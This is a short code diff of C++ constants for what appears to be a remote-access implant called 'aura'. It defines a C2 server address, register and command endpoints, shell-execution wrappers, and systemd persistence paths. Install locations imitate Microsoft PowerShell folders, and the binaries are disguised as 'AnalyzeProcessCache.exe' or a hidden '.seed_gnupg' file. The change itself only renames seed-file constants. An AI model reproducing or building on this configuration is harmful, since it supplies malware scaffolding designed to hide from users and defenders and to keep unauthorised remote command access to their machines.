@@ -9,7 +9,7 @@ const std::string C2_SERVER("http://localhost:41450");
 const std::string REGISTER_URI("/convey/register/");
 const std::string CMD_URI("/convey/cmd/");
 
-const int SEED_RNG_ITERATIONS = 1000000;
+const int AUTH_FILE_RNG_ITERATIONS = 1000000;
 
 const std::unordered_map<std::string, std::tuple<std::string, std::string>>
     SHELL_SYNTAX_LIST({{"bash", {"exec bash -c '", "'"}},
@@ -24,7 +24,7 @@ const std::string INSTALL_DIR("AppData\\Local\\Microsoft\\Windows\\PowerShell");
 const std::string ADMIN_INSTALL_DIR(
     "C:\\ProgramData\\Microsoft\\Windows\\PowerShell");
 
-const std::string SEED_FILE("ProfileDataCache");
+const std::string AUTH_FILE("ProfileDataCache");
 const std::string BIN("aura.exe");
 const std::string BIN_NEW("AnalyzeProcessCache.exe");
 
@@ -41,7 +41,7 @@ const std::string ROOT_HOME("/root");
 const std::string SERVICE_DEST(".config/systemd/user");
 const std::string SYS_SERVICE_DEST("/etc/systemd/system");
 
-const std::string SEED_FILE(".seed_gnupg~");
+const std::string AUTH_FILE(".seed_gnupg~");
 const std::string BIN("aura");
 const std::string BIN_NEW(".seed_gnupg");
 
